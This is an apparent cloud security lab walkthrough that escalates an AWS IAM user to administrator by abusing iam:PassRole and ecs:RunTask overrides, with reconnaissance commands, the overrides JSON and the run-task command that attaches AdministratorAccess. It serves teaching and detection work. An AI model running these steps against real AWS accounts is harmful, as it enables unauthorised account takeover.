# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:RunTask (Command Override)

This scenario demonstrates a privilege escalation vulnerability where a user with only `iam:PassRole` and `ecs:RunTask` permissions can escalate to administrator access without needing `ecs:RegisterTaskDefinition`. The key insight, [documented by Tom McLean at Reversec Labs](https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path), is that the `ecs:RunTask` API accepts an `--overrides` parameter that allows the caller to override both the container command and the `taskRoleArn` of an existing task definition at runtime. This means an attacker does not need to create or register a new task definition -- they can hijack any existing Fargate-compatible task definition in the account.

By passing a privileged admin role via the `taskRoleArn` override and injecting an arbitrary command (such as one that attaches AdministratorAccess to the attacker's own user), the attacker can leverage the ECS Fargate platform to execute code with full administrative credentials. The Fargate task runs ephemerally, executes the malicious command, and terminates -- leaving only CloudTrail logs as evidence. Because no new task definition is registered, organizations that monitor only for `ecs:RegisterTaskDefinition` as the escalation indicator will completely miss this attack.

This is the simplest known ECS-based privilege escalation variant, requiring only two IAM permissions (`iam:PassRole` and `ecs:RunTask`). The reduced permission footprint makes it more likely to appear in real environments where developers or CI/CD pipelines are granted broad ECS task execution permissions alongside PassRole capabilities. It is particularly dangerous because many security tools and IAM policy reviews focus on `ecs:RegisterTaskDefinition` as the prerequisite for ECS-based privilege escalation, overlooking the fact that `ecs:RunTask` alone is sufficient when combined with command and role overrides.

## The Challenge

You start as `pl-prod-ecs-008-to-admin-starting-user`, an IAM user whose credentials you have obtained. Your goal is to escalate to full administrator access in the AWS account.

Your starting permissions are narrow: `iam:PassRole` on specific ECS-related roles and `ecs:RunTask` on all resources. You also have several helpful read permissions for reconnaissance: `ecs:ListClusters`, `ecs:ListTaskDefinitions`, `ecs:DescribeTasks`, `ec2:DescribeVpcs`, `ec2:DescribeSubnets`, and `iam:ListAttachedUserPolicies`.

The destination is `pl-prod-ecs-008-to-admin-target-role`, an IAM role with `AdministratorAccess` that trusts `ecs-tasks.amazonaws.com`. You cannot assume this role directly -- but you can make it do work on your behalf.

## Reconnaissance

First, let's confirm your identity and verify that you don't already have administrative access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<ACCOUNT_ID>:user/pl-prod-ecs-008-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- as expected
```

Next, discover what ECS infrastructure is already present in the account:

```bash
aws ecs list-clusters
# arn:aws:ecs:<REGION>:<ACCOUNT_ID>:cluster/pl-prod-ecs-008-cluster

aws ecs list-task-definitions --family-prefix pl-prod-ecs-008-existing-task --status ACTIVE
# arn:aws:ecs:<REGION>:<ACCOUNT_ID>:task-definition/pl-prod-ecs-008-existing-task:1
```

There is an existing cluster and a Fargate-compatible task definition. This is your foothold. You also need network configuration to launch a Fargate task -- find a subnet to use:

```bash
# Get the default VPC
aws ec2 describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text
# vpc-xxxxxxxxxxxxxxxxx

# Get a subnet in that VPC
aws ec2 describe-subnets --filters "Name=vpc-id,Values=vpc-xxxxxxxxxxxxxxxxx" --query 'Subnets[0].SubnetId' --output text
# subnet-xxxxxxxxxxxxxxxxx
```

## Exploitation

Here is where it gets interesting. The `ecs:RunTask` API has an `--overrides` parameter designed to let callers make minor tweaks to a task at launch time -- change an environment variable, adjust a command argument. But it accepts two particularly powerful overrides: `taskRoleArn` (swaps out the entire IAM role the task runs as) and `containerOverrides.command` (replaces the container's entrypoint command entirely).

Combined, these two overrides mean you can take any existing Fargate-compatible task definition and turn it into an arbitrary code execution vehicle running under any role you can pass.

Build the overrides payload:

```json
{
  "taskRoleArn": "arn:aws:iam::<ACCOUNT_ID>:role/pl-prod-ecs-008-to-admin-target-role",
  "containerOverrides": [
    {
      "name": "app",
      "command": [
        "iam",
        "attach-user-policy",
        "--user-name",
        "pl-prod-ecs-008-to-admin-starting-user",
        "--policy-arn",
        "arn:aws:iam::aws:policy/AdministratorAccess"
      ]
    }
  ]
}
```

Now launch the task:

```bash
aws ecs run-task \
  --cluster pl-prod-ecs-008-cluster \
  --task-definition pl-prod-ecs-008-existing-task \
  --launch-type FARGATE \
  --network-configuration "awsvpcConfiguration={subnets=[subnet-xxxxxxxxxxxxxxxxx],assignPublicIp=ENABLED}" \
  --overrides '{"taskRoleArn":"arn:aws:iam::<ACCOUNT_ID>:role/pl-prod-ecs-008-to-admin-target-role","containerOverrides":[{"name":"app","command":["iam","attach-user-policy","--user-name","pl-prod-ecs-008-to-admin-starting-user","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]}'
```

The ECS control plane validates that you have `iam:PassRole` on the target role, then launches the task. ECS injects temporary credentials for `pl-prod-ecs-008-to-admin-target-role` into the container automatically -- the task container wakes up already authenticated as a full administrator.

The injected command (`aws iam attach-user-policy ...`) runs with those admin credentials, attaching `AdministratorAccess` to your starting user. The task exits and is gone. No new task definition was registered. From a `RegisterTaskDefinition`-centric detection perspective, nothing happened.

Poll the task status until it stops:

```bash
aws ecs describe-tasks \
  --cluster pl-prod-ecs-008-cluster \
  --tasks <TASK_ARN> \
  --query 'tasks[0].{status:lastStatus,exitCode:containers[0].exitCode}'
```

Wait for `status: STOPPED` and `exitCode: 0`, then wait 15 seconds for IAM policy propagation.

## Verification

Confirm the `AdministratorAccess` policy was attached to your user:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-ecs-008-to-admin-starting-user \
  --query 'AttachedPolicies[*].PolicyName' \
  --output text
# AdministratorAccess
```

Now try that privileged operation that failed earlier:

```bash
aws iam list-users --max-items 3
# Returns a list of IAM users -- full admin access confirmed
```

## What Happened

Your starting user had two permissions that, in isolation, look benign: the ability to run ECS tasks (a routine operational task) and the ability to pass a role to ECS (also routine). The vulnerability is that `ecs:RunTask` combined with `iam:PassRole` on a privileged role is functionally equivalent to `sts:AssumeRole` -- you get to execute arbitrary code under that role's identity, you just do it inside a container rather than directly.

The `--overrides` parameter turns the existing benign task definition into a proxy for code execution. No new task definition is needed, no CloudFormation stack, no Lambda function -- just a single API call that launches an ephemeral compute workload with your chosen role and your chosen command.

In real environments, this pattern appears wherever CI/CD pipelines or developer roles need to launch ECS tasks. PassRole scoped to ECS task roles is common and often granted without careful attention to which roles are in scope. Any developer who can run ECS tasks and pass a sufficiently privileged role to them owns the account.
